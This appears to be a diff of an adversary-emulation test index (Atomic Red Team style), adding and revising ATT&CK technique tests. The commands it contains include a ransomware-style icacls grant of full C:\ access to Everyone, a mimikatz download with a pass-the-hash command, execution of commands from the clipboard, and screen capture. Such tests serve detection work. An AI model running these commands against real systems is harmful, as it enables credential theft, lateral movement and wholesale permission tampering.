           echo T1222.001_cacls2 >> #{file_or_folder}\T1222.001_cacls2.txt
       executor:
-        command: 'Icacls.exe #{file_or_folder} /grant #{user_or_group}:F
+        command: 'icacls.exe #{file_or_folder} /grant #{user_or_group}:F
 
 '
         name: command_prompt
@@ -35472,6 +36153,15 @@ defense-evasion:
 
 '
         name: command_prompt
+    - name: Grant Full Access to Entire C:\ Drive for Everyone - Ryuk Ransomware Style
+      auto_generated_guid: ac7e6118-473d-41ec-9ac0-ef4f1d1ed2f6
+      description: Invokes the command line used by Ryuk Ransomware to grant full
+        access to the entire C:\ drive for Everyone.
+      supported_platforms:
+      - windows
+      executor:
+        command: icacls "C:\*" /grant Everyone:F /T /C /Q
+        name: powershell
   T1220:
     technique:
       id: attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3
@@ -38032,6 +38722,17 @@ discovery:
 
 '
         name: command_prompt
+    - name: List Internet Explorer Bookmarks using the command prompt
+      auto_generated_guid: 727dbcdb-e495-4ab1-a6c4-80c7f77aef85
+      description: This test will list the bookmarks for Internet Explorer that are
+        found in the Favorites folder
+      supported_platforms:
+      - windows
+      executor:
+        command: 'dir /s /b %USERPROFILE%\Favorites
+
+'
+        name: command_prompt
   T1087.004:
     technique:
       external_references:
@@ -40062,17 +40763,11 @@ discovery:
       auto_generated_guid: 8f7578c4-9863-4d83-875c-a565573bbdf0
       description: |
         Query Windows Registry.
-
         Upon successful execution, cmd.exe will perform multiple reg queries. Some will succeed and others will fail (dependent upon OS).
-
         References:
-
         https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order
-
         https://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services
-
         http://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf
-
         https://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf
       supported_platforms:
       - windows
@@ -45210,10 +45905,28 @@ lateral-movement:
           description: domain
           type: string
           default: atomic.local
-      executor:
-        command: 'mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}
+        mimikatz_path:
+          description: mimikatz windows executable
+          type: Path
+          default: "%tmp%\\mimikatz\\x64\\mimikatz.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Mimikatz executor must exist on disk and at specified location
+          (#{mimikatz_path})
 
 '
+        prereq_command: |
+          $mimikatz_path = cmd /c echo #{mimikatz_path}
+          if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
+        get_prereq_command: |
+          $mimikatz_path = cmd /c echo #{mimikatz_path}
+          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
+          New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
+          Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
+      executor:
+        command: "#{mimikatz_path} sekurlsa::pth /user:#{user_name} /domain:#{domain}
+          /ntlm:#{ntlm}\n"
         name: command_prompt
     - name: crackmapexec Pass the Hash
       auto_generated_guid: eb05b028-16c8-4ad8-adea-6f5b219da9a9
@@ -45493,7 +46206,7 @@ lateral-movement:
       - Windows
       identifier: T1021.001
     atomic_tests:
-    - name: RDPto-DomainController
+    - name: RDP to DomainController
       auto_generated_guid: 355d4632-8cb9-449d-91ce-b566d0253d3e
       description: 'Attempt an RDP session via Remote Desktop Application to a DomainController.
 
@@ -50159,6 +50872,16 @@ collection:
           echo Get-Process | clip
           Get-Clipboard | iex
         name: powershell
+    - name: Execute commands from clipboard
+      auto_generated_guid: 1ac2247f-65f8-4051-b51f-b0ccdfaaa5ff
+      description: Echo a command to clipboard and execute it
+      supported_platforms:
+      - macos
+      executor:
+        command: |-
+          echo ifconfig | pbcopy
+          $(pbpaste)
+        name: bash
   T1213.001:
     technique:
       external_references:
@@ -51632,9 +52355,10 @@ collection:
 
 '
         name: bash
-    - name: Import
+    - name: Capture Linux Desktop using Import Tool
       auto_generated_guid: 9cd1cccb-91e4-4550-9139-e20a586fcea1
-      description: 'Use import command to collect a full desktop screenshot
+      description: 'Use import command from ImageMagick to collect a full desktop
+        screenshot
 
 '
       supported_platforms:
@@ -51644,6 +52368,16 @@ collection:
           description: Output file path
           type: Path
           default: "/tmp/T1113_desktop.png"
+      dependencies:
+      - description: 'ImageMagick must be installed
+
+'
+        prereq_command: 'if import --version; then exit 0; else exit 1; fi
+
+'
+        get_prereq_command: 'sudo apt-get install imagemagick
+
+'
       executor:
         command: 'import -window root #{output_file}
 
